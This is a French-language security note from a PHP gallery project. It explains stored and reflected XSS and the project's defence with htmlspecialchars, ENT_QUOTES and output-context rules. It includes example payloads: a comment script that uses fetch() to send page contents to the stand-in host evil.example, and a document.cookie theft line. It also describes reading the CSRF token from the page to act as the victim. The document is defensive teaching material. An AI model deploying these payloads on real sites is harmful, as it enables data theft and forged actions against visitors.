# XSS

Une faille XSS survient quand une donnée fournie par un utilisateur (pseudo,
commentaire, e-mail…) est renvoyée dans une page sans échappement : le
navigateur d'un autre visiteur l'interprète comme du HTML ou du JavaScript.

Défense du projet : échappement à l'affichage, dans les vues, avec
`htmlspecialchars`. La donnée est stockée telle quelle et neutralisée à chaque
sortie.

## L'attaque sans échappement

Déroulé d'une XSS stockée, sur une version où un champ affiché n'est pas échappé
(ici un commentaire de la galerie) :

1. L'attaquant poste un « commentaire » qui contient du code au lieu de texte :

   ```html
   Super montage !<script>
     fetch('https://evil.example/vol?d=' + encodeURIComponent(document.body.innerHTML))
   </script>
   ```

2. Sans `htmlspecialchars`, le serveur stocke la chaîne telle quelle et la
   réinsère dans le HTML à chaque affichage de la galerie.

3. À l'ouverture de la galerie, le navigateur de la victime ne distingue pas ce
   script du code légitime : il l'exécute dans l'origine du site, avec la
   session de la victime.

4. Le script s'exécute dans ce contexte pour tous les visiteurs de la galerie.
   Ici, envoi du contenu de la page à `evil.example`.

Portée depuis cette position :

- exfiltration du contenu de la page (données privées, e-mail, jetons du DOM) ;
- action au nom de la victime : lecture du champ `csrf_token` présent dans la
  page et soumission d'un formulaire (`/photo/delete`, `/gallery/comment`). La
  protection CSRF est contournée, le jeton étant lu depuis l'intérieur de la
  page, sans violation de la same-origin policy ;
- redirection, défiguration, enregistrement des frappes.

Variante réfléchie : le code passe par un paramètre d'URL renvoyé sans
échappement au lieu d'être stocké, la victime est piégée par un lien.

Vol du cookie : `<script>document.location='https://evil.example/?c='+document.cookie</script>`
donnerait la session sur un site sans protection. Le cookie est `HttpOnly`
(`Core/Session.php`), `document.cookie` ne le lit pas. L'attaque se replie sur
l'exfiltration et l'action au nom de la victime, la session restant utilisable
tant que le script tourne.

## Échappement en sortie

Toute valeur dynamique insérée dans le HTML passe par `htmlspecialchars` :

```php
<span><?= htmlspecialchars((string) $utilisateur['username']) ?></span>
```

`<`, `>`, `&` sont convertis en entités ; `<script>` s'affiche comme texte au
lieu de s'exécuter.

## Dans un attribut HTML

Un attribut peut être clos par un guillemet simple ou double : ajouter
`ENT_QUOTES` pour échapper les deux.

```php
<input value="<?= htmlspecialchars((string) $valeur, ENT_QUOTES) ?>">
```

Sans `ENT_QUOTES`, une valeur contenant `"` ferme l'attribut et permet d'en
injecter d'autres (`onmouseover=…`).

## Texte multi-ligne

Échapper avant de convertir les retours à la ligne, sinon le `<br>` ajouté est
lui-même échappé :

```php
<p><?= nl2br(htmlspecialchars((string) $commentaire['comment'])) ?></p>
```

## Contextes non couverts par `htmlspecialchars`

`htmlspecialchars` protège le corps HTML et les attributs. Il ne suffit pas si
une donnée est injectée :

- dans un `<script>` (contexte JavaScript) ;
- dans une URL `href`/`src` (un `javascript:…` reste exécutable) ;
- dans un gestionnaire d'événement (`onclick=…`) ;
- dans du CSS en ligne.

Aucune donnée utilisateur n'est insérée dans ces contextes. Une URL fournie par
l'utilisateur est validée (schéma `http`/`https` uniquement) avant affichage.

## Points d'attention

- Échappement en sortie, pas en entrée. La base garde la valeur brute ;
  l'échappement dépend du contexte d'affichage. Échapper avant stockage corrompt
  la donnée et ne couvre pas les autres contextes.
- `charset=utf-8` est déclaré dans `layout.php` : un jeu de caractères ambigu
  peut contourner l'échappement.
- Pas de Content-Security-Policy en place. Un en-tête CSP restreignant les
  sources de scripts limiterait l'impact d'une injection résiduelle
  (durcissement optionnel, non requis par le sujet).
